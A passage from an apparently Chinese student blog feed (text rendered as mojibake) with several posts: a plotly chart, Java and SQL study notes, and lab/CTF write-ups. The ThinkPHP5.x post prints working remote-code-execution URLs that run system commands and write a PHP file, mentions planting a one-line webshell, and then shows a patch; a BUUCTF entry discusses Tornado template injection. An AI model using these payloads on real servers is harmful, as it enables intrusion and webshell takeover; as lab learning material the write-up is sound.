&#123;&#39;width&#39;: 1.5, &#39;color&#39;: &#39;rgb(25,25,25)&#39;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;opacity&#39;: 0.6  #CSS opacity å±æ€§ å¦‚è®¾ç½® div å…ƒç´ çš„ä¸é€æ˜çº§åˆ«ï¼Œè¿™é‡Œè®¾ç½®äº†æ¡å½¢çš„ä¸é€æ˜åº¦ä¸º0.6ï¼Œä»¥å…å›¾è¡¨è¿‡äºæƒ¹çœ¼ã€‚</span><br><span class="line">&#125;]</span><br><span class="line">my_layout &#x3D; &#123;</span><br><span class="line">    &#39;title&#39;: &#39;Githubä¸Šæœ€å—æ¬¢è¿çš„Pythoné¡¹ç›®&#39;,</span><br><span class="line">    &#39;titlefont&#39;: &#123;&#39;size&#39;: 28&#125;,</span><br><span class="line">    &#39;xaxis&#39;:&#123;</span><br><span class="line">        &#39;title&#39;: &#39;Repository&#39;,</span><br><span class="line">        &#39;titlefont&#39;: &#123;&#39;size&#39;: 24&#125;,</span><br><span class="line">        &#39;tickfont&#39;: &#123;&#39;size&#39;: 14&#125;,</span><br><span class="line"></span><br><span class="line">             &#125;,</span><br><span class="line">    &#39;yaxis&#39;:&#123;</span><br><span class="line">        &#39;title&#39;:&#39;Stars&#39;,</span><br><span class="line">        &#39;titlefont&#39;: &#123;&#39;size&#39;: 24&#125;,</span><br><span class="line">        &#39;tickfont&#39;: &#123;&#39;size&#39;: 14&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line">fig &#x3D; &#123;&#39;data&#39;: data, &#39;layout&#39;:my_layout&#125;</span><br><span class="line">offline.plot(fig, filename&#x3D;&#39;python_repos.html&#39;)</span><br></pre></td></tr></table></figure><p><img src="/2021/07/19/python/python-visual/image-20210720101944206.png" alt="image-20210720101944206"></p><p><img src="/2021/07/19/python/python-visual/image-20210720102734849.png" alt="image-20210720102734849"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¯¹APIè·å–çš„æ•°æ®ç”Ÿæˆäº†å¯è§†åŒ–å›¾è¡¨ï¼Œå®ƒæ˜¯äº¤äº’æ€§çš„ï¼ŒåŒ…å«ä¸°å¯Œçš„ä¿¡æ¯ã€‚</p><p>â€‹                                                                        â€”â€”ä»¥ä¸Šä»£ç å’Œéƒ¨åˆ†å†…å®¹æ¥æºäºã€ŠPythonç¼–ç¨‹ ä»å…¥é—¨åˆ°å®è·µã€‹</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThiThinkPHP5.x è¿œç¨‹å‡½æ•°æ‰§è¡Œä¸sqlæ³¨å…¥</title>
      <link href="/2021/07/18/src/ThinkPHP5/"/>
      <url>/2021/07/18/src/ThinkPHP5/</url>
      
        <content type="html"><![CDATA[<h4 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h4><p>å®éªŒåœ°å€ï¼š<a href="https://www.anquanlong.com/lab_detail?lab_id=4&lib=5">ThinkPHP5.x è¿œç¨‹å‡½æ•°æ‰§è¡Œä¸sqlæ³¨å…¥_å®‰å…¨é¾™-ä¸“æ³¨åšä¼ä¸šç½‘ç»œå®‰å…¨æœåŠ¡ä¸ç½‘ç»œå®‰å…¨åŸ¹è®­! (anquanlong.com)</a></p><p>çŸ¥è¯†æ¢³ç†ï¼š</p><p><strong>PoC</strong>ï¼Œå…¨ç§°â€œProof of Conceptâ€ï¼Œä¸­æ–‡â€œæ¦‚å¿µéªŒè¯â€ï¼Œå¸¸æŒ‡ä¸€æ®µæ¼æ´è¯æ˜çš„ä»£ç ã€‚</p><p><strong>Exp</strong>ï¼Œå…¨ç§°â€œExploitâ€ï¼Œä¸­æ–‡â€œåˆ©ç”¨â€ï¼ŒæŒ‡åˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»çš„åŠ¨ä½œã€‚</p><p><strong>Payload</strong>ï¼Œä¸­æ–‡â€œæœ‰æ•ˆè½½è·â€ï¼ŒæŒ‡æˆåŠŸ exploit ä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤ã€‚</p><p><strong>Shellcode</strong>ï¼Œç®€å•ç¿»è¯‘â€œshell ä»£ç â€ï¼Œæ˜¯ Payload çš„ä¸€ç§ï¼Œç”±äºå…¶å»ºç«‹æ­£å‘/åå‘ shell è€Œå¾—åã€‚</p><p>ï¼ˆç”¨èšå‰‘è¿ä¸Šä¹‹åï¼Œå‘ç°è¿™æ˜¯å®‰å…¨é¾™éƒ¨ç½²åœ¨é˜¿é‡Œäº‘ä¸Šçš„ç¯å¢ƒï¼‰</p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(280).png"></p><p>â€‹    é¦–å…ˆå°è¯•äº†è¿œç¨‹å‡½æ•°æ¼æ´çš„åˆå§‹è¯­å¥ï¼š</p><p><code>?s=index/\think\app/invokefunction&amp;function=system&amp;return_value=&amp;command=</code></p><p><code>å¯æ‰§è¡ŒLinuxå‘½ä»¤</code></p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(281).png"></p><p>ç„¶åæˆ‘ä»¬æŒ‰ç…§æç¤ºå»å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œphpinfoçš„åŠŸèƒ½</p><p>åˆ©ç”¨åˆ°äº†file_put_contentså‡½æ•°ï¼ˆPOCåˆ†æï¼‰</p><p><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=./test.php&amp;vars[1][]=&lt;?php%20phpinfo();?&gt;</code></p><p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191745523.png" alt="image-20210718191745523"></p><p>å›æ˜¾å‡ºäº†æ•°å­—18ï¼Œè¡¨ç¤ºæˆ‘ä»¬å†™å…¥æ–‡ä»¶æˆåŠŸ</p><p>æ¥ç€è¿›è¡Œè®¿é—®</p><p>test.php</p><p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191940910.png" alt="image-20210718191940910"></p><p>å‡ºç°å¦‚ä¸Šé¡µé¢ï¼ŒæˆåŠŸåˆ©ç”¨æ¼æ´ã€‚</p><p>æ¥ç€æˆ‘è¿˜å°è¯•äº†ä¸€å¥è¯æœ¨é©¬çš„å†™å…¥ï¼Œç­”æ¡ˆæ˜¾ç„¶ï¼Œä¹Ÿæ˜¯å¯ä»¥å†™å…¥å¹¶åˆ©ç”¨çš„ã€‚</p><p>æœ€åèšå‰‘è¿æ¥å³å¯ã€‚</p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(284).png"></p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(285).png"></p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(286).png"></p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(287).png"></p><p>åˆ©ç”¨å®Œæ¼æ´ï¼Œå¯¹äºæˆ‘ä»¬æ¥è¯´æœ€é‡è¦çš„å­¦ä¼šå»ä¿®å¤</p><p>æ¥ä¸‹æ¥å­¦ä¹ ä¿®å¤è¿™ä¸ªæ¼æ´</p><p>1.æ·»åŠ ä¸€æ®µä»£ç åˆ°App.phpçš„554è¡Œ</p><p><code>if (!preg_match(&#39;/^[A-Za-z](\w)*$/&#39;, $controller)) &#123;</code></p><p><code>            throw new HttpException(404, &#39;controller not exists:&#39; . $controller);</code></p><p><code>        &#125;</code></p><p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193014082.png" alt="image-20210718193014082"></p><p>ä¿®æ”¹ä¹‹åï¼Œä½¿ç”¨åŸæ¥çš„pocå‘ç°å¤±æ•ˆäº†</p><p>æ¼æ´ä¿®å¤æˆåŠŸã€‚</p><p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193101116.png" alt="image-20210718193101116"></p><h4 id="é™„å½•ï¼š"><a href="#é™„å½•ï¼š" class="headerlink" title="é™„å½•ï¼š"></a>é™„å½•ï¼š</h4><p>æœ€è¿‘äº†è§£åˆ°æœ‰msfï¼Œkaliå·²ç»å®‰è£…äº†ï¼Œwin10ä¸‹ä¹Ÿè£…å¥½äº†ï¼Œ</p><p>å°±å·®æˆåŠŸæ”»å‡»ä¸€ä¸‹windowsever2018 r2</p><p>å†å°è¯•å°è¯•</p><p>8.24æŠ¥å‘Šï¼šå†æ¬¡ä½¿ç”¨msfæ¡†æ¶ï¼Œè¯•å›¾åˆ©ç”¨<strong>æ°¸æ’ä¹‹è“</strong>æ¼æ´ï¼Œä½†å§‹ç»ˆå¡åœ¨äº†å»ºç«‹sessionä¸Š</p><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¹‹å‰åœ¨é¶æœºä¸Šè£…äº†360å¯¼è‡´æ‰“äº†è¡¥ä¸ã€‚ã€‚ã€‚ã€‚</p><p><img src="/2021/07/18/src/ThinkPHP5/image-20210825085712815.png"></p><p><img src="/2021/07/18/src/ThinkPHP5/QQ%E5%9B%BE%E7%89%8720210825085949.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå­¦ä¹ è®°å½•</title>
      <link href="/2021/07/09/java/java1/"/>
      <url>/2021/07/09/java/java1/</url>
      
        <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p> å°è¯•äº†å¥½å‡ ç§ç¼–ç¨‹è½¯ä»¶ï¼Œå‘ç”Ÿäº†ä¸åŒç¨‹åº¦æŠ¥é”™</p><p>pycharmï¼šè¿æ¥debuggerå¤±è´¥</p><p>sublintextï¼šæ‰©å±•è¾ƒmafan</p><p>eclipseï¼šå±Šæ—¶åº”è¯¥ä¼šç”¨</p><p>æœ€ç»ˆæ•²å®šåœ¨å‡æœŸä½¿ç”¨vscodeæ¥ç¼–ç¨‹java</p><h4 id="7-9"><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h4><p>ç»è¿‡æ˜¨å¤©çš„å¤šæ¬¡å¤±è´¥ï¼Œä»Šå¤©æˆåŠŸè¿è¡Œäº†Javaï¼Œæ‰“å°å‡ºäº†helloworld</p><p>æ€»ç»“ä¸€ä¸‹ï¼š<strong>æ–‡ä»¶åéœ€ä¸ç±»åä¸€è‡´</strong></p><p>ä½¿ç”¨äº†ä¸¤ä¸ªå‘½ä»¤ <strong>javac</strong> å’Œ <strong>java</strong>ã€‚</p><p>æ‰§è¡Œå‰å…ˆç”¨Javacç¼–è¯‘ï¼Œæ³¨æ„è¦å¸¦ä¸Šåç¼€ã€‚</p><p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(269).png" alt="å±å¹•æˆªå›¾(269)"></p><p><img src="/2021/07/09/java/java1/662E827A-FA32-4464-B0BD-40087F429E98.jpg" alt="img"></p><h5 id="èœé¸Ÿæ•™ç¨‹ä¸Šçš„åŸºæœ¬è¯­æ³•ï¼š"><a href="#èœé¸Ÿæ•™ç¨‹ä¸Šçš„åŸºæœ¬è¯­æ³•ï¼š" class="headerlink" title="èœé¸Ÿæ•™ç¨‹ä¸Šçš„åŸºæœ¬è¯­æ³•ï¼š"></a>èœé¸Ÿæ•™ç¨‹ä¸Šçš„åŸºæœ¬è¯­æ³•ï¼š</h5><ul><li><strong>å¤§å°å†™æ•æ„Ÿ</strong>ï¼šJava æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œè¿™å°±æ„å‘³ç€æ ‡è¯†ç¬¦ Hello ä¸ hello æ˜¯ä¸åŒçš„ã€‚</li><li><strong>ç±»å</strong>ï¼šå¯¹äºæ‰€æœ‰çš„ç±»æ¥è¯´ï¼Œç±»åçš„é¦–å­—æ¯åº”è¯¥å¤§å†™ã€‚å¦‚æœç±»åç”±è‹¥å¹²å•è¯ç»„æˆï¼Œé‚£ä¹ˆæ¯ä¸ªå•è¯çš„é¦–å­—æ¯åº”è¯¥å¤§å†™ï¼Œä¾‹å¦‚ <strong>MyFirstJavaClass</strong> ã€‚</li><li><strong>æ–¹æ³•å</strong>ï¼šæ‰€æœ‰çš„æ–¹æ³•åéƒ½åº”è¯¥ä»¥å°å†™å­—æ¯å¼€å¤´ã€‚å¦‚æœæ–¹æ³•åå«æœ‰è‹¥å¹²å•è¯ï¼Œåˆ™åé¢çš„æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ã€‚</li><li><strong>æºæ–‡ä»¶å</strong>ï¼šæºæ–‡ä»¶åå¿…é¡»å’Œç±»åç›¸åŒã€‚å½“ä¿å­˜æ–‡ä»¶çš„æ—¶å€™ï¼Œä½ åº”è¯¥ä½¿ç”¨ç±»åä½œä¸ºæ–‡ä»¶åä¿å­˜ï¼ˆåˆ‡è®° Java æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼‰ï¼Œæ–‡ä»¶åçš„åç¼€ä¸º <strong>.java</strong>ã€‚ï¼ˆå¦‚æœæ–‡ä»¶åå’Œç±»åä¸ç›¸åŒåˆ™ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼‰ã€‚</li><li><strong>ä¸»æ–¹æ³•å…¥å£</strong>ï¼šæ‰€æœ‰çš„ Java ç¨‹åºç”± <strong>public static void main(String[] args)</strong> æ–¹æ³•å¼€å§‹æ‰§è¡Œã€‚</li></ul><p>çªç„¶å‘ç°ä¹‹å‰æ— æ„ä¸­çœ‹åˆ°çš„vsdebuggeræœ‰bugæ˜¯çœŸçš„ï¼Œå•Šè¿™</p><p>è°ƒè¯•åŠå¤©éƒ½ä¸è¡Œï¼Œè¿˜æ˜¯ç›´æ¥cmdå‘½ä»¤è¡Œæ›´å¿«ã€‚ä¹Œé±¼å­ã€‚ã€‚</p><h4 id="7-10"><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h4><p>æ¸…æ™¨èµ·æ¥è¯•äº†ä¸€ä¸‹ï¼Œå¾ˆå¿«å—·ï¼ˆdogeï¼‰</p><p>åˆ‡æ¢vscodeé‡Œçš„æ–­ç‚¹ï¼Œè¯¯æ‰“è¯¯æ’æˆåŠŸäº†ï¼Œç›´æ¥å¯ä»¥ç¼–è¯‘è¿è¡ŒJavaæ–‡ä»¶ï¼Œå¥½è€¶</p><p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(271).png"></p><p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(273).png" alt="å±å¹•æˆªå›¾(273)"></p><p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(272).png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæµ‹è¯•</title>
      <link href="/2021/05/31/sql/sql%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/05/31/sql/sql%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>SQL æµ‹éªŒ</th><th>ç»“æœ:14/6</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><strong>1. SQL æŒ‡çš„æ˜¯ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> Structured Query Language</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>2. å“ªä¸ª SQL è¯­å¥ç”¨äºä»æ•°æ®åº“ä¸­æå–æ•°æ®ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> GET</p><p> å›ç­”é”™è¯¯!</p><p> æ­£ç¡®ç­”æ¡ˆï¼šSELECT</p><hr><p><strong>3. å“ªæ¡ SQL è¯­å¥ç”¨äºæ›´æ–°æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> UPDATE</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>4. å“ªæ¡ SQL è¯­å¥ç”¨äºåˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> DELETE</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>5. å“ªæ¡ SQL è¯­å¥ç”¨äºåœ¨æ•°æ®åº“ä¸­æ’å…¥æ–°çš„æ•°æ®ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> INSERT INTO</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>6. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•ä» â€œPersonsâ€ è¡¨ä¸­é€‰å– â€œFirstNameâ€ åˆ—ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> SELECT FirstName FROM Persons</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>7. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•ä» â€œPersonsâ€ è¡¨ä¸­é€‰å–æ‰€æœ‰çš„åˆ—ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> SELECT * FROM Persons</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>8. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•ä» â€œPersonsâ€ è¡¨ä¸­é€‰å– â€œFirstNameâ€ åˆ—çš„å€¼ç­‰äºâ€Peterâ€ çš„æ‰€æœ‰è®°å½•ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> SELECT * FROM Persons WHERE FirstName=â€™Peterâ€™</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>9. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•ä» â€œPersonsâ€ è¡¨ä¸­é€‰å– â€œFirstNameâ€ åˆ—çš„å€¼ä»¥ â€œaâ€ å¼€å¤´çš„æ‰€æœ‰è®°å½•ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> SELECT * FROM Persons WHERE FirstName=â€™aâ€™</p><p> å›ç­”é”™è¯¯!</p><p> æ­£ç¡®ç­”æ¡ˆï¼šSELECT * FROM Persons WHERE FirstName LIKE â€˜a%â€™</p><hr><p><strong>10. è¯·åˆ¤æ–­ä¸‹åˆ—è¯´æ³•æ˜¯å¦æ­£ç¡®ï¼šå½“æ‰€åˆ—å‡ºçš„æŸä¸ªæ¡ä»¶ä¸º true æ—¶ï¼ŒOR è¿ç®—ç¬¦ä¼šæ˜¾ç¤ºè®°å½•ã€‚å½“åˆ—å‡ºçš„æ‰€æœ‰æ¡ä»¶ä¸º true æ—¶ï¼ŒAND è¿ç®—ç¬¦ä¼šæ˜¾ç¤ºè®°å½•ã€‚</strong></p><p><strong>ä½ çš„å›ç­”:</strong> æ­£ç¡®</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>11. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•åœ¨è¡¨ Persons ä¸­é€‰æ‹© FirstName ç­‰äº Thomas è€Œ LastName ç­‰äº Carter çš„æ‰€æœ‰è®°å½•ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> SELECT * FROM Persons WHERE FirstName LIKE â€˜Thomasâ€™ AND LastName LIKE â€˜Carterâ€™</p><p> å›ç­”é”™è¯¯!</p><p> æ­£ç¡®ç­”æ¡ˆï¼šSELECT * FROM Persons WHERE FirstName=â€™Thomasâ€™ AND LastName=â€™Carterâ€™</p><hr><p><strong>12. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•æŒ‰å­—æ¯é¡ºåºé€‰å– Persons è¡¨ä¸­ LastName ä»‹äº Adams å’Œ Carter çš„æ‰€æœ‰è®°å½•ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> SELECT * FROM Persons WHERE LastName BETWEEN â€˜Adamsâ€™ AND â€˜Carterâ€™</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>13. å“ªæ¡ SQL è¯­å¥å¯è¿”å›å”¯ä¸€ä¸åŒçš„å€¼ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> SELECT UNIQUE</p><p> å›ç­”é”™è¯¯!</p><p> æ­£ç¡®ç­”æ¡ˆï¼šSELECT DISTINCT</p><hr><p><strong>14. å“ªä¸ª SQL å…³é”®è¯ç”¨äºå¯¹ç»“æœé›†è¿›è¡Œæ’åºï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> ORDER BY</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>15. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•æ ¹æ® â€œFirstNameâ€ åˆ—é™åºåœ°ä» â€œPersonsâ€ è¡¨è¿”å›æ‰€æœ‰è®°å½•ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> SELECT * FROM Persons ORDER BY FirstName DESC</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>16. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•å‘ â€œPersonsâ€ è¡¨æ’å…¥æ–°çš„è®°å½•ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> INSERT INTO Persons VALUES (â€˜Jimmyâ€™, â€˜Jacksonâ€™)</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>17. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•å‘ â€œPersonsâ€ è¡¨ä¸­çš„ â€œLastNameâ€ åˆ—æ’å…¥ â€œWilsonâ€ ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> INSERT INTO Persons (LastName) VALUES (â€˜Wilsonâ€™)</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>18. æ‚¨å¦‚ä½•æŠŠ â€œPersonsâ€ è¡¨ä¸­ â€œLastNameâ€ åˆ—çš„ â€œGatesâ€ æ”¹ä¸º â€œWilsonâ€ ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> MODIFY Persons SET LastName=â€™Wilsonâ€™ WHERE LastName=â€™Gatesâ€™</p><p> å›ç­”é”™è¯¯!</p><p> æ­£ç¡®ç­”æ¡ˆï¼šUPDATE Persons SET LastName=â€™Wilsonâ€™ WHERE LastName=â€™Gatesâ€™</p><hr><p><strong>19. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•åœ¨ â€œPersonsâ€ è¡¨ä¸­åˆ é™¤ â€œFirstNameâ€ ç­‰äº â€œFredâ€ çš„çºªå½•ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> DELETE FROM Persons WHERE FirstName = â€˜Fredâ€™</p><p> å›ç­”æ­£ç¡®!</p><hr><p><strong>20. é€šè¿‡ SQLï¼Œæ‚¨å¦‚ä½•è¿”å› â€œPersonsâ€ è¡¨ä¸­è®°å½•çš„æ•°ç›®ï¼Ÿ</strong></p><p><strong>ä½ çš„å›ç­”:</strong> SELECT COUNT() FROM Persons</p><p> å›ç­”é”™è¯¯!</p><p> æ­£ç¡®ç­”æ¡ˆï¼šSELECT COUNT(*) FROM Persons</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çˆ¬è™«</title>
      <link href="/2021/05/19/python/%E7%88%AC%E8%99%AB/"/>
      <url>/2021/05/19/python/%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<p> ä»Šå¤©ç»ˆäºæ˜¯æˆåŠŸåšåˆ°äº†pythonçˆ¬è™«</p><p>ä¹‹å‰çš„å¤±è´¥</p><p>æ€»ç»“äº†ä¸€ä¸‹å¤ªæƒ³å½“ç„¶ç›´æ¥æ¬äººå®¶ä»£ç </p><p>æ‰€ä»¥æœ‰äº›åº“æ²¡å®‰è£…éƒ½ä¸è®¤çœŸçœ‹</p><p>å°å°å¼€å¿ƒä¸€ä¸‹ï¼Œå˜¿å˜¿</p><p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(214).png"></p><p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(215).png"></p><p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(216).png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mutiple</title>
      <link href="/2021/05/12/buu/0/"/>
      <url>/2021/05/12/buu/0/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux-Labs"><a href="#Linux-Labs" class="headerlink" title="Linux Labs"></a>Linux Labs</h2><p><img src="/2021/05/12/buu/0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(144).png"></p><p>æ‰“å¼€é¶æœºåæç¤ºè¿æ¥</p><p>æŒ‡ä»¤æ ¼å¼ ssh -p port</p><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œè¾“å…¥ ssh -p  27891 <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#110;&#111;&#100;&#x65;&#51;&#46;&#x62;&#117;&#x75;&#111;&#106;&#x2e;&#x63;&#110;">&#x72;&#x6f;&#111;&#116;&#x40;&#110;&#111;&#100;&#x65;&#51;&#46;&#x62;&#117;&#x75;&#111;&#106;&#x2e;&#x63;&#110;</a></p><p>å¯†ç ï¼š123456</p><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>æ‰“å¼€å®¹å™¨é¡µé¢å</p><p>å‡ºç°ä¸‰ä»½.txt</p><p><a href="http://bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/flag.txt&filehash=a9c5250a1a124c1b907c4d6a178a6341">/flag.txt</a><br><a href="http://bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/welcome.txt&filehash=62d96003865b8d60293618c385b943cb">/welcome.txt</a><br><a href="http://bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/hints.txt&filehash=f8da6a5eb4dc6a43b5f16b2170c5d2b5">/hints.txt</a></p><p>å…¶ä¸­ï¼Œflag.txtä¿¡æ¯ä¸ºï¼š</p><p>flag in /fllllllllllllagï¼Œå‘Šè¯‰äº†æˆ‘ä»¬flagåœ¨æ–‡ä»¶fllllllllllllagé‡Œï¼›</p><p>welcome.txtä¿¡æ¯ä¸ºï¼š</p><p>renderï¼Œçœ‹äº†writeupï¼ŒçŸ¥é“äº†è¿™é‡Œæ˜¯æç¤ºæˆ‘ä»¬renderå‡½æ•°çš„æ¨¡æ¿æ³¨å…¥</p><p>æ‰¾åˆ°åŸç†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡&#123;&#123;&#125;&#125;è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚</span><br></pre></td></tr></table></figure><p>æ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_34942265/article/details/113671944">(3æ¡æ¶ˆæ¯) pythonæ¨¡æ¿æ³¨å…¥_python SSTI tornado renderæ¨¡æ¿æ³¨å…¥_neo andersonçš„åšå®¢-CSDNåšå®¢</a></p><p>hint.txtä¿¡æ¯ä¸ºï¼š</p><p>/hints.txt<br>md5(cookie_secret+md5(filename))ï¼Œï¼Œç»™æˆ‘ä»¬äº†ä¸€ä¸ªè®¡ç®—å…¬å¼</p><p>æ³¨æ„æ­¤æ—¶urlè·¯å¾„<img src="/2021/05/12/buu/0/image-20210513194955869.png" alt="image-20210513194955869"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;hints.txt&amp;filehash&#x3D;f8da6a5eb4dc6a43b5f16b2170c5d2b5](http:&#x2F;&#x2F;bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;f8da6a5eb4dc6a43b5f16b2170c5d2b5)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åé¢æœ‰æ˜æ˜¾çš„hashå€¼æç¤ºï¼ŒçŒœæµ‹æ–‡ä»¶è®¿é—®è·¯å¾„æ ¼å¼å°±æ˜¯è¿™æ 